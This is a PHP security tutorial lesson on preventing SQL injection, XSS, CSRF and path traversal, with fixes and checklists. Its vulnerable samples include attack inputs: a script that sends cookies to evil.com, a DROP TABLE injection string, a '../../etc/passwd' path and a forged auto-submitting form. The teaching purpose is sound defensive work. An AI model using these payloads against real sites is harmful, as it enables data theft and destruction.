---
sidebar_position: 16
---

# 15 — Security Essentials

**Estimated time:** ~20 minutes  
**After this lesson, you will be able to:** prevent the four most common PHP security vulnerabilities — SQL injection, XSS, CSRF, and path traversal.

---

## The Hook

PHP has a reputation for insecurity. That reputation was earned by PHP 4 code written in 2003.  
Modern PHP with PDO, htmlspecialchars, and CSRF tokens is as secure as any other language.  
The bugs are not in PHP — they're in developers who don't know the rules.

This lesson teaches the rules.

---

## 1. SQL Injection

**The threat:** user input included directly in a SQL query lets an attacker read or destroy your database.

```php
// VULNERABLE
$id  = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
// Visit ?id=1 OR 1=1 — dumps all users
// Visit ?id=1; DROP TABLE users; — destroys the table
```

**The fix:** prepared statements — always:

```php
// SAFE — user input is a parameter, never part of the SQL
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$_GET['id']]);
$user = $stmt->fetch();
```

The database receives the SQL and the data as separate packets. User input can never change the query's meaning.

**Rule:** never build SQL with string concatenation or interpolation. Use `?` placeholders. No exceptions.

---

## 2. Cross-Site Scripting (XSS)

**The threat:** displaying user input without escaping lets an attacker inject JavaScript into your page.

```php
// VULNERABLE — if $name = '<script>document.location="https://evil.com/?c="+document.cookie</script>'
echo "Welcome, $name!";
// Everyone who loads this page has their cookies stolen
```

**The fix:** `htmlspecialchars()` before every echo of user data:

```php
function h(string $v): string {
  return htmlspecialchars($v, ENT_QUOTES, 'UTF-8');
}

echo "Welcome, " . h($name) . "!";
// Output: Welcome, &lt;script&gt;...&lt;/script&gt;!
// Browser shows text, does not execute
```

What `htmlspecialchars` converts:
| Character | Escaped to |
|-----------|-----------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |
| `&` | `&amp;` |

**Rule:** wrap every `echo` of user-supplied or database-stored text in `h()`.

---

## 3. CSRF (Cross-Site Request Forgery)

**The threat:** a malicious website tricks a logged-in user's browser into making requests to your app.

```html
<!-- On evil.com -->
<form action="https://yourapp.com/posts/delete" method="POST">
  <input type="hidden" name="id" value="123">
</form>
<script>document.forms[0].submit()</script>
```

If the user is logged in to `yourapp.com`, their browser sends the session cookie automatically — and the post is deleted.

**The fix:** CSRF tokens — a secret value that only your forms know:

```php
// Generate a token and store it in the session
function csrfToken(): string {
  if (session_status() === PHP_SESSION_NONE) session_start();
  if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
  }
  return $_SESSION['csrf_token'];
}

// Verify on form submission
function verifyCsrf(): void {
  $token = $_POST['csrf_token'] ?? '';
  if (!hash_equals($_SESSION['csrf_token'] ?? '', $token)) {
    http_response_code(403);
    die('CSRF token mismatch');
  }
}
```

Include the token in every form:
```php
<form method="POST" action="/posts/delete">
  <input type="hidden" name="csrf_token" value="<?= h(csrfToken()) ?>">
  <input type="hidden" name="id" value="<?= (int) $post['id'] ?>">
  <button type="submit">Delete</button>
</form>
```

And verify on every POST handler:
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  verifyCsrf();
  // proceed...
}
```

`hash_equals` does a timing-safe comparison — it prevents timing attacks that could leak the token.

---

## 4. Path Traversal

**The threat:** user input used in a file path lets an attacker read arbitrary files from your server.

```php
// VULNERABLE
$filename = $_GET['file'];
$content  = file_get_contents('/var/www/uploads/' . $filename);
// ?file=../../etc/passwd reads the system password file
```

**The fix:** `basename()` strips directory components:

```php
// SAFE — strips any ../ components
$filename = basename($_GET['file']);
$path     = '/var/www/uploads/' . $filename;

// Also verify the resolved path is inside the expected directory
$realPath    = realpath($path);
$uploadDir   = realpath('/var/www/uploads/');

if ($realPath === false || !str_starts_with($realPath, $uploadDir . DIRECTORY_SEPARATOR)) {
  http_response_code(400);
  die('Invalid file');
}

$content = file_get_contents($realPath);
```

---

## 5. Sensitive Data Exposure

```php
// Never log or display these
$password    = $_POST['password'];  // don't log
$creditCard  = $_POST['card'];      // don't store plain text
$apiKey      = getenv('API_KEY');   // don't echo in HTML

// Never commit to git
.env
config/database.php  // if it contains credentials
```

Set `display_errors = Off` in production. An error message that shows a file path or database name is an information leak.

---

## 6. Headers — Content Security Policy

Prevent XSS as a defence-in-depth measure:

```php
// Send security headers on every response
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Referrer-Policy: strict-origin-when-cross-origin");
```

Or use the `league/security-headers` Composer package to manage them.

---

## Security Checklist

| Vulnerability | Rule | Check |
|--------------|------|-------|
| SQL injection | Prepared statements always | `?` placeholders — never string concat |
| XSS | `htmlspecialchars()` always | Every `echo` of user data wrapped in `h()` |
| CSRF | Token in every POST form | `verifyCsrf()` at start of every POST handler |
| Path traversal | `basename()` + `realpath()` check | Never trust user-supplied file paths |
| Passwords | `password_hash()` + bcrypt | Never MD5, never plain text |
| Sessions | `session_regenerate_id()` on login | Prevents session fixation |
| Errors | `display_errors = Off` in prod | No stack traces or paths visible to users |

---

## Common Mistakes

| Mistake | Vulnerability | Fix |
|---------|--------------|-----|
| `echo $_GET['q']` | XSS | `echo h($_GET['q'])` |
| `"WHERE id = $id"` | SQL injection | `'WHERE id = ?', [$id]` |
| POST form without CSRF token | CSRF | Add token field, verify on submission |
| `file_get_contents('/uploads/' . $_GET['f'])` | Path traversal | `basename()` + directory check |
| `password_hash($pass, PASSWORD_MD5)` | Weak hashing | `PASSWORD_BCRYPT` with cost 12 |

---

## Checkpoint

- [ ] All SQL uses prepared statements — zero string interpolation in queries
- [ ] Every `echo` of user/database data uses `h()` (htmlspecialchars)
- [ ] All POST forms include a CSRF token, verified on submission
- [ ] File paths from user input pass through `basename()` and `realpath()` check
- [ ] `display_errors` is off for production

---

**Next:** [Capstone Project — Blog CMS](./project-blog-cms)
